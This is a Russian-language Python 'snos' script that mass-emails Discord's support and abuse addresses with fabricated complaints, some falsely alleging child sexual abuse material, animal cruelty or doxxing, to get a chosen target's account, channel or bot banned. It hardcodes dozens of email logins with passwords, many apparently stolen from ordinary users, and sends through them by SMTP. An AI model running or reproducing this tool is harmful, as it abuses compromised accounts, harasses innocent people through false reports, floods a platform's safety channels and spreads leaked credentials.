import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
import pyfiglet
from termcolor import colored 
a=input("Введи пароль для запуска программы:")
if a!="123":
	print(colored(f"Пароль не верен! Завершаю работу программы! ", 'red'))
	print(colored(f"Уточни его у создателей discord: 9mice_dev", 'red'))
	exit()
else:
	print(colored(f"Пароль верен! Запускаю работу программы!", 'green'))

# ASCII-арт приветствия
ascii_banner = pyfiglet.figlet_format("9Mice Dev Snos")
colored_banner = colored(ascii_banner, color='magenta')  # Красим в цвет
print(colored_banner)

senders = {
    'kreinmean@gmail.com': 'nexc bqqt wtvz ebpe', 
    'vanyakillerpro@gmail.com': 'znse sqti xtob qary',
    'sane976460@gmail.com': 'ihxc mlit cotd frkj',
    'sane492849@gmail.com': 'cmdp rtsx tckg unym',
    'sane97646@gmail.com': 'rlnk mghz jpsl fafd', 
    'fastik907@gmail.com': 'huuo kwaw iizj lgek',
    'danyasigma228777@gmail.com': 'nyxh zmxv rkxi rtom',
    'kdkskfkskkdkwkd@gmail.com': 'vnva gfmo xncg gctg',
    'ueaeusas@gmail.com': 'hdlh iowa ypun rjwb',
    'sane976462@gmail.com': 'utvg ahxh cjmn xqjm',
    'krutojrybak1@gmail.com': 'ldoi wlwy bmfo zave',
    'sane976463@gmail.com': 'dvij qtgr heym vinr',
    'zenadusa86@gmail.com': 'rwzu msao bavj viiy',
    'korolleha678@gmail.com': 'kbfz xbnt vveu psun', 
    'sanya.dragonov@mail.ru': 'RakuzanSnos',
    'avyavya.vyaavy@mail.ru': 'zmARvx1MRvXppZV6xkXj',
    'gdfds98@mail.ru': '1CtFuHTaQxNda8X06CaQ',
    'dfsdfdsfdf51@mail.ru': 'SXxrCndCR59s5G9sGc6L',
    'aria.therese.svensson@mail.com': 'Zorro1ab',
    'taterbug@verizon.net': 'Holly1!',
    'ejbrickner@comcast.net': 'Pass1178',
    'teressapeart@cox.net': 'Quinton2329!',
    'liznees@verizon.net': 'Dancer008',
    'olajakubovich@mail.com': 'OlaKub2106OlaKub2106',
    'kcdg@charter.net': 'Jennifer3*',
    'bean_118@hotmail.com': 'Liverpool118!',
    'dsdhjas@mail.com': 'LONGHACH123',
    'robitwins@comcast.net': 'May241996',
    'wasina@live.com': 'Marlas21',
    'aruzhan.01@mail.com': '1234567!',
    'rob.tackett@live.com': 'metallic',
    'lindahallenbeck@verizon.net': 'Anakin@2014',
    'hlaw82@mail.com': 'Snoopy37$$',
    'paintmadman@comcast.net': 'mycat2200*',
    'prideandjoy@verizon.net': 'Ihatejen12',
    'sdgdfg56@mail.com': 'kenwood4201',
    'garrett.danelz@comcast.net': 'N11golfer!',
    'gillian_1211@hotmail.com': 'Gilloveu1211',
    'sunpit16@hotmail.com': 'Putter34!',
    'fdshelor@verizon.net': 'Masco123*',
    'yeags1@cox.net': 'Zoomom1965!',
    'amine002@usa.com': 'iScrRoXAei123',
    'bbarcelo16@cox.net': 'Bsb161089$$',
    'laliebert@hotmail.com': 'pirates2',
    'vallen285@comcast.net': 'Delft285!1!',
    'sierra12@email.com': 'tegen1111',
    'luanne.zapevalova@mail.com': 'FqWtJdZ5iN@',
    'kmay@windstream.net': 'Nascar98',
    'redbrick1@mail.com': 'Redbrick11',
    'ivv9ah7f@mail.com': 'K226nw8duwg',
    'erkobir@live.com': 'floydLAWTON019',
    'Misscarter@mail.com': 'ashtray19',
    'carlieruby10@cox.net': 'Lollypop789$',
    'blackops2013@mail.com': 'amason123566',
    'caroline_cullum@comcast.net': 'carter14',
    'dpb13@live.com': 'Ic&ynum13',
    'heirhunter@usa.com': 'Noguys@714',
    'sherri.edwards@verizon.net': 'Dreaming123#',
    'rami.rami1980@hotmail.com': 'ramirami1980',
    'jmsingleton2@comcast.net': '151728Jn$$',
    'aberancho@aol.com': '10diegguuss10',
    'dgidel@iowatelecom.net': 'Buster48',
    'gpopandopul@mail.com': 'GEORG62A',
    'bolgodonsk@mail.com': '012345678!',
    'colbycolb@cox.net': 'Signals@1'
}
receivers = [
'support@discordapp.com',
'abuse@discordapp.com',
'terms@discordapp.com',
'security@discordapp.com',
'privacy@discordapp.com',
'trustandsafety@discordapp.com',
'community@discordapp.com',
'spamsupport@discordapp.com',
'copyright@discordapp.com',
'fraud@discordapp.com',
'partnerships@discordapp.com',
'payment@discordapp.com',
'developer@discordapp.com',
'bot@discordapp.com',
'feedback@discordapp.com',
'legal@discord.com',
'compliance@discord.com',
'gdpr@discord.com',
'dmca@discord.com',
'brand@discord.com',
'press@discordapp.com',
'events@discordapp.com',
'partners@discord.com',
'bugs@discordapp.com',
]


def menu():
    print("Меню: ")
    print("1. Снос аккаунтов")
    print("2. Снос каналов")
    print("3. Aвторы проекта")
    print("4. Снос бота")
    choice = input("Введите номер: ")
    return choice
def send_email(receiver, sender_email, sender_password, subject, body):
    try:
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver
        msg.attach(MIMEText(body, 'plain'))
        server = smtplib.SMTP('smtp.mail.ru', 587)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver, msg.as_string())
        time.sleep(0.0000000001)
        server.quit()
        return True
    except Exception as e:
        return False

def main():
    sent_emails = 0
    choice = menu()
    if choice == '1':
        print("1. Спам")
        print("2. Личные данные")
        print("3. Троллинг")
        print("4. Снос сессий")
        print("5. Нитро дс")
        print("6. Виртуальный номер")
        comp_choice = input("Выберите способ: ")
        if comp_choice in ["1", "2", "3"]:
            username = input("discord @username: ")
            id = input("discord ID: ")
            chat_link = input("Ссылка на дс сервер: ")
            violation_link = input("Ссылка на нарушение: ")
            comp_texts = {
                "1": f"Здравствуйте, уважаемая поддержка. На платформе Discord я нашел пользователя, который отправляет много ненужных сообщений - СПАМ. Его юзернейм - {username}, его айди discord - {id}, ссылка на Дискорд Сервер С нарушениям  - {chat_link}, ссылка на нарушения - {violation_link}. Пожалуйста, примите меры по отношению к данному пользователю, включая удаление его аккаунта.",
                "2": f"Здравствуйте, уважаемая поддержка, на платформе Discord я нашел пользователя, который распространяет чужие данные невинных Людей без их согласия. Его юзернейм discord - {username}, его айди discord - {id}, ссылка на Дискорд Сервер С нарушениям - {chat_link}, ссылка на нарушение/нарушения - {violation_link}. Пожалуйста примите меры по отношению к данному пользователю путем блокировки его акккаунта.",
                "3": f"Здравствуйте, уважаемая поддержка, на платформе Discord я нашел пользователя, который распространяет чужие данные без их согласия. Его юзернейм - {username}, его айди discord - {id}, ссылка на Дискорд Сервер С нарушениям - {chat_link}, ссылка на нарушение/нарушения - {violation_link}. Пожалуйста примите меры по отношению к данному пользователю путем блокировки его акккаунта."
            }
            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[comp_choice]
                    comp_body = comp_text.format(username=username.strip(), id=id.strip(), chat_link=chat_link.strip(),
                                                 violation_link=violation_link.strip())
                    send_email(receiver, sender_email, sender_password, 'Жалоба на аккаунт телеграм', comp_body)
                    print(colored(f"Отправлено на {receiver} от {sender_email}!", 'green'))
                    sent_emails += 1488888
                    time.sleep(0.0000000001)

        elif comp_choice == "4":
            username = input("@username: ")
            id = input("discord id: ")
            comp_texts = {
                "4": f"Здравствуйте, уважаемая поддержка. Я случайно перешел по фишинговой ссылке и утерял доступ к своему аккаунту. Его юзернейм - {username}, его айди - {id}. Пожалуйста удалите аккаунт или обнулите сессии акаунта discord"
            }

            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[comp_choice]
                    comp_body = comp_text.format(username=username.strip(), id=id.strip())
                    send_email(receiver, sender_email, sender_password, 'Я утерял свой аккаунт в discord', comp_body)
                    print(colored(f"Отправлено на {receiver} от {sender_email}!", 'green'))
                    sent_emails += 1488888
                    time.sleep(0.0000000001)

        elif comp_choice in ["5", "6"]:
            username = input("username: ")
            id = input("discord Id: ")
            comp_texts = {
                "5": f"Добрый день поддержка discord!Аккаунт {username} , {id} использует виртуальный номер купленный на сайте по активации номеров. Отношения к номеру он не имеет, номер никак к нему не относиться.Прошу разберитесь с этим. Заранее спасибо!",
                "6": f"Добрый день поддержка discord! Аккаунт {username} {id} приобрёл Discord Nitro в вашем мессенджере чтобы рассылать спам-сообщения и обходить ограничения discord.Прошу проверить данную жалобу и принять меры!"
            }

            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[comp_choice]
                    comp_body = comp_text.format(username=username.strip(), id=id.strip())
                    send_email(receiver, sender_email, sender_password, 'Жалоба на пользователя discord', comp_body)
                    print(colored(f"Отправлено на {receiver} от {sender_email}!", 'green'))
                    sent_emails += 9999999
                    time.sleep(0.0000000001)


    elif choice == "2":
        
        print("1. Личные данные")
        print("2. Живодерство")
        print("3. ЦП")
        print("4. Прайс")
        ch_choice = input("Выберите способ: ")

        if ch_choice in ["1", "2", "3", "4"]:
            channel_link = input("Ссылка на канал: ")
            channel_violation = input("Ссылка на нарушение: ")
            comp_texts = {
                "1": f"Здравствуйте, уважаемая поддержка дискорд. На вашей платформе я нашел канал, который распространяет личные данные невинных людей. Ссылка на канал - {channel_link}, сслыки на нарушения - {channel_violation}. Пожалуйста заблокируйте данный канал.",
                "2": f"Здравствуйте, уважаемая поддержка дискорд. На вашей платформе я нашел канал который распространяет жестокое обращение с животными. Ссылка на канал - {channel_link}, сслыки на нарушения - {channel_violation}. Пожалуйста заблокируйте данный канал.",
                "3": f"Здравствуйте, уважаемая поддержка дискорд. На вашей платформе я нашел канал который распространяет порнографию с участием несовершеннолетних. Ссылка на канал - {channel_link}, сслыки на нарушения - {channel_violation}. Пожалуйста заблокируйте данный канал.",
                "4": f"Здравствуйте,уважаемый модератор дискорд,хочу пожаловаться вам на канал,который продает услуги доксинга, сваттинга. Ссылка на телеграмм канал:{channel_link} Ссылка на нарушение:{channel_violation} Просьба заблокировать данный канал."
            }

            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[ch_choice]
                    comp_body = comp_text.format(channel_link=channel_link.strip(), channel_violation=channel_violation.strip)
                    send_email(receiver, sender_email, sender_password, 'Жалоба на discord канал', comp_body)
                    print(colored(f"Отправлено на {receiver} от {sender_email}!", 'green'))
                    sent_emails += 10000000
                    time.sleep(0.0000000001)

    elif choice == "3":
        print("@edelweissadpt")

    elif choice == "4":
        print("1. Глаз Бога")
        bot_ch = input("Выберите: ")

        if bot_ch == "1":
            bot_user = input("@username: ")
            comp_texts = {
                "1": f"Здравствуйте, уважаемая поддержка discord. На вашей платформе я нашел бота, который осуществляет поиск по личным данным ваших пользователей. Ссылка на бота - {bot_user}. Пожалуйста разберитесь и заблокируйте данного бота."
                       }
            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[bot_ch]
                    comp_body = comp_text.format(bot_user=bot_user.strip())
                    send_email(receiver, sender_email, sender_password, 'Жалоба на бота discord', comp_body)
                    print(colored(f"Отправлено на {receiver} от {sender_email}!", 'green'))
                    sent_emails += 19999999
                    time.sleep(0.0000000001)
        
        

  
if __name__ == "__main__":
    main()